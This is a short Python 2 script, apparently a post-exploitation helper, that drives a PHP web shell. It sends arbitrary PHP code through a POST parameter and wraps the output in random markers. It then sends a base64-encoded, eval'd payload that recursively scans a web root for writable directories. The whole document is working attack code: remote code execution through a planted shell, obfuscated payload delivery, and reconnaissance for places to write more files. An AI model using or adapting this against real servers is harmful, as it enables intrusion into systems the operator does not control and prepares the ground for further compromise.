#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import random
import string

def random_string(length):
    result = [random.choice(string.letters) for i in range(length)]
    return "".join(result)

def code_exec(url, code):
    flag = random_string(0x10)
    data = {
        "c":"echo '%s';%s;echo '%s';" % (flag, code, flag)
    }
    response = requests.post(url, data=data)
    content = response.content
    if flag in content:
        return content.split(flag)[1]
    return content

def get_writable_dir(url, root):
    code = "function scan($path){ foreach(scandir($path) as $file){ if($file == '.' || $file == '..'){ continue; } if(is_dir($path.'/'.$file)){ if(is_writable($path.'/'.$file)){ echo $path.'/'.$file.\"\n\"; } scan($path.'/'.$file); } } } scan('" + root + "');"
    payload = "eval(base64_decode('%s'));" % (code.encode("base64"))
    return code_exec(url, payload).split("\n")[0:-1]

def main():
    url = "http://127.0.0.1/c.php"
    root = "/var/www/html"
    print get_writable_dir(url, root)

if __name__ == "__main__":
    main()
